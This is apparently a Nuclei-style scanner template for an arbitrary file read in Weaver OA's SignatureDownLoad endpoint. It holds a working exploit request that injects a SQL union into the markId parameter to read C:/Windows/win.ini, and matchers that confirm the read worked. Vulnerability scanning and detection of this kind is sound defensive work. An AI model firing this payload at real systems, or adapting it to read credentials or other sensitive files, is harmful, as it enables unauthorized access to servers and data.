id: poc-yaml-weaver-signature-download-arbitrary-file-read
info:
  name: 泛微OA SignatureDownLoad 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
http:
  - method: GET
    path:
      - "{{BaseURL}}/weaver/weaver.file.SignatureDownLoad?markId=1+union+select+'C:/Windows/win.ini'"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "; for 16-bit app support"
        part: body
      - type: word
        words:
          - "<"
        part: body
        negative: true
